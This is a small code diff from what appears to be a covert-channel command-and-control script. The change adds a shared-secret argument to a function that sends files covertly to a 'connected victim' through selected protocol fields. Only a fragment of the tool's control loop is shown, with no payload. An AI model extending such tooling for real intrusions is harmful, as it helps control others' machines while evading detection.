@@ -88,7 +88,7 @@ if __name__ == '__main__':
                         else:
                             choices = protocol_and_field_selector()
                             transfer_file_covert(client_socket, client_ip, client_port,
-                                                 source_ip, source_port, choices)
+                                                 source_ip, source_port, shared_secret, choices)
 
                     # CASE 3: Send file to any specific connected victim
                     elif len(connected_clients) != constants.ZERO:
